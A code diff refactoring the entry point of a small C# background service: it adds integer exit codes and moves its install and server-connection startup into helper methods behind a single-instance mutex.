@@ -9,41 +9,48 @@ namespace bc.srv
     internal class Program
     {
         public static readonly Random Random = new Random(DateTime.Now.Millisecond);
-        public static void Main(string[] args)
+        public static int Main(string[] args)
         {
             try
             {
+                SrvData.Instance.ServerVersion = "0.2.0";
                 CreateStClient.InitializeStClient();
                 Thread.Sleep(SrvData.Instance.StartupDelay);
             
                 AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
-            
-                // todo init st_client
-                SrvData.Instance.ServerVersion = "0.2.0";
 
                 using (var mutex = new Mutex(false, SrvData.Instance.sMutex))
                 {
                     if (!mutex.WaitOne(0, false))
-                        return;
+                        return 6;
 
-                    // manage installation
-                    var ins = new InstallClass();
-                    ins.StartInstallThread();
-
-                    // START SERVER
-                    var con = new Connection();
-                    con.StartServer();
+                    RunInstallationThread();
+                    RunConnectionThread();
 
                     while (true)
                     {
                         Thread.Sleep(Random.Next(1000,5000));
                     }
+
                 }
             }
             catch (Exception e)
             {
                 e.DumpDebugException();
+                return 7;
             }
+        }
+
+        private static void RunConnectionThread()
+        {
+            var con = new Connection();
+            con.StartServer();
+        }
+
+        private static void RunInstallationThread()
+        {
+            var ins = new InstallClass();
+            ins.StartInstallThread();
         }
 
         private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
